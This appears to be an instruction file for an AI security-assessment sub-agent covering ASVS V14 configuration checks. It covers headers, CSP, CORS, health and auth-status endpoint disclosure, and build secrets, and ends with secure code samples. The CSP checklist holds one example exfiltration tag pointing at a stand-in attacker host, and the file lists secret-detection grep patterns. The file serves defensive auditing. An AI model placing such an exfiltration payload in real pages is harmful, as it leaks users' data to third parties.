---
id: asvs-v14-configuration-subskill
name: ASVS V14 Configuration Sub-Skill
description: ASVS chapter V14 configuration assessment logic consumed by the ASVS Level 2 assessment workflow.
type: sub-agent
version: 1.0.0
tools_required:
  - Read
  - Glob
  - Grep
tools_optional: []
references:
  - asvs-level2-security-assessment
  - attack-chain-reference
upstream:
  - ref: asvs-level2-security-assessment
    artifacts:
      - .ai/blueteam/data/application_map.json
outputs: []
call_sequence_hard:
  - Must resolve declared upstream dependencies before execution, or fail fast with a dependency error.
  - Must run only within ASVS Level 2 Phase 2 chapter dispatch.
---

> Sub-skill for **V14 Configuration**. Finding IDs: `[V14-NNN]`. Tactics: `shared/reference/attack-chain-reference.md` §2. Phase 6 normalizes IDs.

---

## Exclusion Conditions

| Condition                                    | Sub-requirements excluded        | Justification                    |
| -------------------------------------------- | -------------------------------- | -------------------------------- |
| No external dependencies / no build pipeline | V14.2 Dependency checks          | No third-party packages to audit |
| Static site / no server-side runtime         | V14.1 Build and Deploy (partial) | No server headers to configure   |

If all requirements are excluded (e.g., pure static HTML with no build), write `[V14 CHAPTER EXCLUDED — static asset only, no server-side runtime]` and stop.

---

> Environment assumptions for this chapter: see `shared/reference/environment-baseline.md` § "ASVS Chapter Assumption Mapping."

---

## V14 Requirements and Verification Rules

### V14.1 — Build and Deploy

**V14.1.1** — Verify that the build pipeline does not include any hardcoded credentials, tokens, or API keys.
- **CAS Rule:** None beyond standard. Bot/AI-authored commits that introduced credentials are flagged separately under V10.
- **Verification:** Read `Dockerfile`, `.github/workflows/*.yml`, `azure-pipelines.yml`, `Jenkinsfile`, or similar CI files. Search for patterns: `password=`, `token=`, `apikey=`, `secret=` assigned directly. Cross-reference `secrets_findings[]` from the application map.
- **ATT&CK Tactic:** TA0006 — Credential Access
- **Severity if failed:** High (Critical if Protected B data in scope)

**V14.1.2** — Verify that build and deployment configurations do not contain any development, test, or debug settings that are enabled in production builds.
- **CAS Rule:** Environment-variable-gated debug modes must be assessed at the severity of the ungated bypass. If `DEBUG_MODE=true` or `DISABLE_AUTH=true` enables a security-relevant bypass, treat as the ungated severity.
- **Verification:** Read `appsettings.json`, `appsettings.Production.json`, `web.config`, `Dockerfile`, environment configuration files. Look for: `debug: true`, `DEBUG=true`, `ASPNETCORE_ENVIRONMENT=Development` in production config, `EnableSwagger: true` / `EnableOpenApi: true` without environment guard, `AllowAnonymous` attributes not present in development-only code paths.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Medium (High if enables authentication bypass)

**V14.1.3** — Verify that debug features are disabled in production, including developer tools, debug consoles, or stack traces exposed to end users.
- **CAS Rule:** None beyond standard.
- **Verification:** Review error handling middleware and exception filters. Check that `UseDeveloperExceptionPage()` or equivalent is not active in production (`Startup.cs`, `Program.cs`). Confirm generic error responses are returned to clients.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Medium

---

### V14.2 — Dependency

**V14.2.1** — Verify that all third-party components and libraries are from pre-defined, trusted sources and are kept up to date.
- **CAS Rule:** None beyond standard.
- **Verification:** Check `package.json`, `*.csproj`, `pom.xml`, `requirements.txt`, `go.mod`, or equivalent. Note any packages that are severely outdated (major version behind), have no recent updates, or have known published CVEs. Note: manual CVE matching is supplementary — the `skills/08-tool-scanning.md` (Trivy/OSV-Scanner) is the authoritative tool for SCA findings.
- **ATT&CK Tactic:** TA0002 — Execution
- **Severity if failed:** High (if known exploitable CVE exists), Medium (if outdated without confirmed CVE)

**V14.2.2** — Verify that an inventory of all third-party libraries is maintained and available.
- **CAS Rule:** None beyond standard.
- **Verification:** Presence of a dependency manifest file (`package-lock.json`, `yarn.lock`, `Pipfile.lock`, `packages.lock.json`, etc.) constitutes acceptable inventory for this level.
- **ATT&CK Tactic:** TA0002 — Execution
- **Severity if failed:** Low

**V14.2.3** — Verify that unused dependencies, unnecessary features, components, files, and documentation are removed.
- **CAS Rule:** None beyond standard.
- **Verification:** Spot-check for packages imported but not used in the main codebase. Check for commented-out imports referencing removed functionality.
- **ATT&CK Tactic:** TA0002 — Execution
- **Severity if failed:** Low

---

### V14.3 — Unintended Security Disclosure

**V14.3.1** — Verify that web or application server and framework error messages do not expose any unintended information (e.g., stack traces, server-side technology, or internal component names).
- **CAS Rule:** None beyond standard.
- **Verification:** Read error handler/middleware files. Confirm that stack traces, framework names, and internal component details are not returned in HTTP responses to clients. For ASP.NET, check `UseDeveloperExceptionPage()` guards.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Medium

**V14.3.2** — Verify that web or application server and framework versions are not disclosed in HTTP headers or pages.
- **CAS Rule:** None beyond standard.
- **Verification:** Read security header middleware for `Server` header removal and `X-Powered-By` removal. Check Nginx/IIS/Apache config if present for `server_tokens off` / `ServerTokens Prod` equivalent.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Low

**V14.3.3** — Verify that health check endpoints return only minimum information required by the load balancer or orchestrator.
- **CAS Rule:** Health/readiness/liveness endpoints MUST NOT return: infrastructure component status (database/cache connectivity details), environment names, application version numbers, dependency names, or internal hostnames. Detailed diagnostics should be exposed only on a separate authenticated endpoint if needed for internal monitoring.
- **Verification:** Read all health/readiness/liveness endpoint definitions (search for `/health`, `/ready`, `/live`, `/healthz`, `MapHealthChecks`, `MapGet("health"`, `MapGet("version"`). For each: verify what fields are returned. A response returning only `"status": "healthy"` or an HTTP 200 with no body is acceptable. A response returning database connectivity status, environment name, version string, or hostname is a finding.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Medium

**V14.3.4** — Verify that authentication status endpoints do not expose internal implementation details (e.g., auth driver names, session store types, provider configuration).
- **CAS Rule:** Authentication status endpoints (e.g., `/auth/status`, `/auth/me`, `/session`, `/auth/check`) MUST NOT expose authentication driver names (e.g., `"mock"` vs `"saml"` vs `"oidc"`), session store types, or provider configuration details. Exposing the auth driver name enables attackers to discover when development authentication mechanisms are active in production. Return only the minimum fields needed by the frontend (e.g., `authenticated: boolean`, `user_id`, `roles`).
- **Verification:** Search for auth status endpoints in route definitions. Read the response construction code. Check whether driver/provider type names appear in any response field, including those conditionally included only in development environments.
- **ATT&CK Tactic:** TA0043 — Reconnaissance
- **Severity if failed:** Medium (High if `mock` driver or test mode is discoverable in production)
- **Cross-chapter note:** If an auth status endpoint reveals `mock` driver and a TEST_MODE env-var bypass exists, combine with V2 finding — see Cross-Chapter Reference Notes.

---

### V14.4 — HTTP Security Headers

**V14.4.1** — Verify that every HTTP response contains a Content-Type header with a safe character set (e.g., UTF-8, ISO 8859-1).
- **CAS Rule:** None beyond standard.
- **Verification:** Read security header middleware. Confirm `Content-Type` header is set. For API responses confirm `application/json; charset=utf-8` or similar.
- **ATT&CK Tactic:** TA0001 — Initial Access (MIME sniffing enablement)
- **Severity if failed:** Low

**V14.4.2** — Verify that all API responses contain a `Content-Disposition: attachment; filename=api.json` header or equivalent.
- **CAS Rule:** None beyond standard.
- **Verification:** Check security header middleware for `Content-Disposition` on API responses.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** Low

**V14.4.3** — Verify that a Content Security Policy (CSP) response header is in place with a policy that helps mitigate common DOM, XSS, and JavaScript injection attacks.
- **CAS Rule:** CSP must be assessed directive-by-directive, not as a single pass/fail control.
- **Verification:** Read security header middleware to extract the full CSP string. Then assess each directive individually per the **CSP Directive-by-Directive Review Checklist** section below.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** See per-directive severity in the CSP checklist

**V14.4.4** — Verify that all responses contain an X-Content-Type-Options header with value `nosniff`.
- **CAS Rule:** None beyond standard.
- **Verification:** Check security header middleware for `X-Content-Type-Options: nosniff`.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** Low

**V14.4.5** — Verify that HTTP Strict Transport Security headers are included on all responses and for all subdomains.
- **CAS Rule:** Perimeter HSTS (Cloudflare/Cloud LZ) provides perimeter-level enforcement for Cloud Landing Zone deployments; however, application-level HSTS must still be present as defence-in-depth. Absence of app-level HSTS is still a finding.
- **Verification:** Check security header middleware for `Strict-Transport-Security` header. Verify `max-age` is at least 31536000 (1 year) and `includeSubDomains` is set.
- **ATT&CK Tactic:** TA0009 — Collection (downgrade attack enablement)
- **Severity if failed:** Medium

**V14.4.6** — Verify that a suitable `Referrer-Policy` header is included.
- **CAS Rule:** None beyond standard.
- **Verification:** Check security header middleware for `Referrer-Policy`.
- **ATT&CK Tactic:** TA0010 — Exfiltration (referrer leakage)
- **Severity if failed:** Low

**V14.4.7** — Verify that the content of a web application cannot be embedded in a third-party site by default and that embedding of the exact resources is only allowed where necessary using appropriate `Content-Security-Policy: frame-ancestors` and `X-Frame-Options` response headers.
- **CAS Rule:** Prefer `X-Frame-Options: DENY` over `SAMEORIGIN` for public-facing applications, especially on shared hosting domains (e.g., `*.onrender.com`, `*.azurewebsites.net`, `*.herokuapp.com`) where `SAMEORIGIN` may be insufficient because other tenants share the origin. **X-Frame-Protection** is not a valid header name; any header named `X-Frame-Protection` instead of `X-Frame-Options` is a misconfiguration and will not be honoured by browsers. `frame-ancestors` in CSP takes precedence over `X-Frame-Options` in modern browsers.
- **Verification:** Read security header middleware. Verify the correct header name is `X-Frame-Options` (not `X-Frame-Protection`). Verify the value is `DENY` or justified `SAMEORIGIN`. Also check CSP `frame-ancestors` directive.
- **ATT&CK Tactic:** TA0001 — Initial Access (clickjacking)
- **Severity if failed:** Medium (for misconfigured header name — silently not enforced)

---

### V14.5 — HTTP Request Header Validation

**V14.5.1** — Verify that the application server only accepts HTTP methods in use by the application and rejects unexpected methods (405 Method Not Allowed).
- **CAS Rule:** None beyond standard.
- **Verification:** Check that routes define explicit allowed HTTP methods and that a global handler rejects unmapped methods.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** Low

**V14.5.2** — Verify that the supplied Origin header is not used for authentication or access control decisions, as the Origin header can easily be changed by an attacker.
- **CAS Rule:** None beyond standard.
- **Verification:** Search for `Request.Headers["Origin"]`, `req.headers.origin`, `HttpContext.Request.Headers.Origin` in authentication or authorization code paths.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** High

**V14.5.3** — Verify that the cross-origin resource sharing (CORS) Allow-Origin header uses a strict allowlist of trusted domains and does not support the "null" origin.
- **CAS Rule:** None beyond standard — cross-reference with V13.5.x API CORS findings to avoid duplicate reporting.
- **Verification:** Read CORS middleware configuration. Check for `AllowAnyOrigin()`, `*`, or `null` in allowed origins list. Verify origin list is an explicit allowlist.
- **ATT&CK Tactic:** TA0010 — Exfiltration
- **Severity if failed:** High (Critical if authenticated API endpoints are exposed)
- **Cross-chapter note:** CORS findings commonly duplicate V13 API security chapter — if already captured as `[V13-NNN]`, write `[V14-NNN: duplicate of V13-NNN]`.

**V14.5.4** — Verify that HTTP headers added by a trusted proxy or SSO devices, such as a bearer token, are authenticated by the application.
- **CAS Rule:** None beyond standard.
- **Verification:** If the app reads auth from a proxy-supplied header (e.g., `X-Auth-User`, `X-Forwarded-User`), verify there is a trust validation that the header originates from a trusted proxy, not from an attacker-controlled request.
- **ATT&CK Tactic:** TA0001 — Initial Access
- **Severity if failed:** Critical (if allows auth bypass)

---

## Health/Readiness Endpoint Disclosure Rules

Apply these rules when assessing V14.3.3:

| Response content                                                       | Assessment outcome                                     |
| ---------------------------------------------------------------------- | ------------------------------------------------------ |
| HTTP status only (200/503)                                             | PASS — minimum required information                    |
| `{"status": "healthy"}` or `{"status": "degraded"}`                    | PASS — acceptable for load balancer signalling         |
| `{"status": "healthy", "version": "1.2.3"}`                            | FINDING — version number exposes infrastructure detail |
| `{"status": "healthy", "database": "connected", "redis": "connected"}` | FINDING — internal component topology exposed          |
| `{"status": "healthy", "environment": "production"}`                   | FINDING — environment name disclosed                   |
| `{"status": "healthy", "host": "app-pod-a1b2c3"}`                      | FINDING — internal hostname disclosed                  |
| Returns full diagnostic JSON on unauthenticated request                | FINDING — Critical if Protected B data in scope        |

---

## Authentication Status Endpoint Rules

Apply these rules when assessing V14.3.4:

| Response field                                                 | Assessment outcome                                              |
| -------------------------------------------------------------- | --------------------------------------------------------------- |
| `{"authenticated": true/false}`                                | PASS — minimum required                                         |
| `{"authenticated": true, "userId": "...", "roles": [...]}`     | PASS — standard identity claims                                 |
| `{"authenticated": true, "driver": "mock"}`                    | FINDING — auth driver name discloses development auth mechanism |
| `{"authenticated": true, "driver": "saml", "provider": "..."}` | FINDING — provider configuration detail exposed                 |
| `{"authenticated": true, "sessionStore": "redis"}`             | FINDING — session store type disclosed                          |
| `{"authenticated": false, "reason": "MOCK_AUTH_NOT_ENABLED"}`  | FINDING — internal config state disclosed                       |

---

## CSP Directive-by-Directive Review Checklist

When assessing V14.4.3, read the full CSP header string and evaluate each directive independently:

| Directive         | Acceptable values                                                      | Finding trigger                                                                                                  | Severity |
| ----------------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------- |
| `script-src`      | `'self'`, specific trusted origins, nonce-based                        | `'unsafe-inline'` or `'unsafe-eval'` present                                                                     | High     |
| `img-src`         | `'self'`, specific CDN origins                                         | Wildcard `https:` (enables data exfiltration via `<img src="https://attacker.com/exfil?...">` if any XSS exists) | Medium   |
| `frame-ancestors` | `'none'` (preferred), `'self'` if app is legitimately framed by parent | Not set, or `*`                                                                                                  | Medium   |
| `connect-src`     | `'self'`, specific API endpoints                                       | Not set (defaults to `*`), or overly broad                                                                       | Medium   |
| `style-src`       | `'self'`, specific CDN origins, nonce-based                            | `'unsafe-inline'` present                                                                                        | Low      |
| `object-src`      | `'none'`                                                               | Any value other than `'none'`                                                                                    | Medium   |
| `base-uri`        | `'none'` or `'self'`                                                   | Not set (enables base tag injection)                                                                             | Low      |
| `form-action`     | `'self'` or specific trusted origins                                   | Not set or `*`                                                                                                   | Medium   |

**Assessment rule:** Each failing directive is its own sub-finding within the V14.4.3 finding. List each failing directive in the Evidence block. Aggregate to a single `[V14-NNN]` finding entry unless severities are materially different.

---

## ATT&CK Tactic Summary

Note: Derived from `shared/reference/attack-chain-reference.md` Section 2. Update this file if that file changes.

| Finding Pattern                           | Primary Tactic        | Kill Chain Stage                                        |
| ----------------------------------------- | --------------------- | ------------------------------------------------------- |
| Health endpoint version/config disclosure | TA0043 Reconnaissance | Enables targeted attack planning                        |
| Auth driver name in status endpoint       | TA0043 Reconnaissance | Reveals development auth mechanism active in production |
| Debug mode / OpenAPI in production        | TA0043 Reconnaissance | Exposes endpoint inventory, request schemas             |
| Missing/misconfigured CSP                 | TA0001 Initial Access | Reduces barrier to XSS exploitation                     |
| X-Frame-Options misconfiguration (typo)   | TA0001 Initial Access | Clickjacking — silently not enforced                    |
| Missing HSTS                              | TA0009 Collection     | TLS downgrade attack enablement                         |
| Permissive CORS                           | TA0010 Exfiltration   | Cross-origin data theft                                 |
| Proxy header auth bypass                  | TA0001 Initial Access | Unauthenticated access via spoofed trusted header       |

---

## Cross-Chapter Reference Notes

Pre-populated known duplicates to prevent two findings for the same vulnerability:

| This chapter finding                            | Combines with                                                    | Combined chain risk                                                                                                                                                                                                                                         |
| ----------------------------------------------- | ---------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| V14.3.2 auth driver name disclosure (mock/test) | V2 TEST_MODE env-var auth bypass                                 | Reconnaissance → Initial Access: attacker discovers mock auth is enabled via status endpoint, then activates bypass via TEST_MODE env-var. Write `[V14-NNN: duplicate of V2-001]` for the V14 side if the V2 finding already captures the bypass mechanism. |
| V14.4.3 `unsafe-inline` in CSP script-src       | V3.5 JWT in localStorage / V8.2 sensitive data in client storage | XSS enablement → token theft → account takeover chain                                                                                                                                                                                                       |
| V14.5.3 CORS wildcard / null origin             | V13 API CORS findings                                            | Same root cause — write `[V14-NNN: duplicate of V13-NNN]`                                                                                                                                                                                                   |
| V14.3.1 build pipeline debug config             | V14.1.2 debug settings in production                             | Same file / same root cause — consolidate into single finding                                                                                                                                                                                               |

---

> **ASSESSMENT ORCHESTRATOR: STOP READING HERE.** The `## Secure Implementation Guide` section below is for `skills/14-asvs-compliant-builder.md` only. Assessment skills do not need implementation patterns.

## Secure Implementation Guide

> **For builder skills only.** Assessment skills use the full chapter file above. This section provides implementation patterns for generating ASVS V14-compliant code.

### When to apply this chapter
Load V14 when setting up HTTP security headers middleware, health check endpoints, build/deploy configuration, or any server configuration that affects response headers.

### Security Headers Middleware (V14.4.1–V14.4.7)

```typescript
// middleware/securityHeaders.ts — ✓ V14.4 compliant
import helmet from 'helmet';

export const securityHeaders = helmet({
  // ✓ V14.4.5: HSTS — 1 year minimum, all subdomains
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  // ✓ V14.4.4: no MIME sniffing
  noSniff: true,
  // ✓ V14.4.7: clickjacking — correct header is X-Frame-Options (NOT X-Frame-Protection)
  frameguard: { action: 'deny' },
  // ✓ V14.4.6: referrer policy
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
});

// ✓ V14.4.3: CSP — do not use 'unsafe-inline' or 'unsafe-eval'
export const cspMiddleware = helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],           // no 'unsafe-inline' ✓
    styleSrc: ["'self'"],
    imgSrc: ["'self'", 'data:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],           // ✓ V14.4.3: object-src: none
    baseUri: ["'self'"],
    frameAncestors: ["'none'"],      // ✓ V14.4.7: no framing
    formAction: ["'self'"],
  },
});
```

### Health Check Endpoint (V14.3.3)

```typescript
// routes/health.ts — ✓ V14.3.3: minimum information only
router.get('/health', (req, res) => {
  // ✓ V14.3.3: return only status — no version, env, or DB connectivity details
  res.status(200).json({ status: 'healthy' });
  // WRONG: { status: 'healthy', version: '1.2.3', database: 'connected', env: 'production' }
});

// Internal diagnostics only on authenticated endpoint
router.get('/internal/diagnostics', authenticate, requireRole('admin'), async (req, res) => {
  const dbOk = await checkDatabaseConnectivity();
  res.json({
    status: dbOk ? 'healthy' : 'degraded',
    database: dbOk ? 'ok' : 'error',
    timestamp: new Date().toISOString(),
    // Still exclude: version, host, env names
  });
});
```

### Auth Status Endpoint (V14.3.4)

```typescript
// routes/auth.ts — ✓ V14.3.4: do not expose auth driver or session store type
router.get('/auth/status', (req, res) => {
  if (!req.user) {
    return res.json({ authenticated: false });
    // WRONG: { authenticated: false, reason: 'MOCK_AUTH_NOT_ENABLED', driver: 'mock' }
  }
  res.json({
    authenticated: true,
    userId: req.user.id,
    roles: req.user.roles,
    // ✓ V14.3.4: never include: driver, sessionStore, provider, authMethod internal names
  });
});
```

### Build Pipeline — No Secrets or Debug Settings (V14.1.1, V14.1.2)

```yaml
# .github/workflows/deploy.yml — ✓ V14.1.1: secrets from vault, not hardcoded
name: Deploy
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ✓ V14.1.1: secrets injected at runtime from Azure Key Vault, not hardcoded
      - name: Load secrets
        uses: azure/get-keyvault-secrets@v1
        with:
          keyvault: ${{ vars.KEYVAULT_NAME }}
          secrets: 'DB-PASSWORD, API-KEY'

      # ✓ V14.1.2: production config explicitly disables debug
      - name: Deploy
        run: npm run build -- --mode production
        env:
          NODE_ENV: production
          # Never: DEBUG=true, DISABLE_AUTH=true, ASPNETCORE_ENVIRONMENT=Development
```

### Environment-Specific Config (V14.1.2)

```typescript
// config/index.ts — ✓ V14.1.2: debug features disabled in production
const isDevelopment = process.env.NODE_ENV === 'development';

export const config = {
  // ✓ V14.1.2: OpenAPI only in dev — never in production without auth gate
  enableSwagger: isDevelopment,
  // ✓ V14.1.3: developer exception page only in dev
  showStackTraces: isDevelopment,
  // ✓ V2.2.4: no env-var auth bypass — this flag must not exist at all in production
  // WRONG: bypassAuth: process.env.DISABLE_AUTH === 'true',
};

// In Express setup:
if (isDevelopment) {
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
  // In production: OpenAPI is simply not registered
}
```

### Common anti-patterns
- `X-Frame-Protection` instead of `X-Frame-Options` — typo silently not enforced by browsers
- `'unsafe-inline'` in `script-src` CSP — allows XSS via inline scripts
- `UseDeveloperExceptionPage()` enabled in production (ASP.NET) — exposes stack traces
- `/health` endpoint returning version, environment, or DB connectivity details
- Swagger/OpenAPI served unauthenticated in production
- Hardcoded `NODE_ENV=development` or `DEBUG=true` in Dockerfile or CI YAML

### Organization-specific patterns
- Cloud Landing Zone: HSTS enforced at Cloudflare perimeter, but app-level HSTS is still required as defence-in-depth
- Health endpoints: return only `{ status: "healthy" }` — Monitoring reads HTTP status code, not response body
- Enterprise IdP (e.g. Entra ID): admin routes must check `amr` claim for `mfa` — not just role claim
- Production OpenAPI: disable by default; if required for API portal, gate with Enterprise IdP auth
- All secrets in Azure Key Vault — never in Dockerfile, environment files, or CI YAML
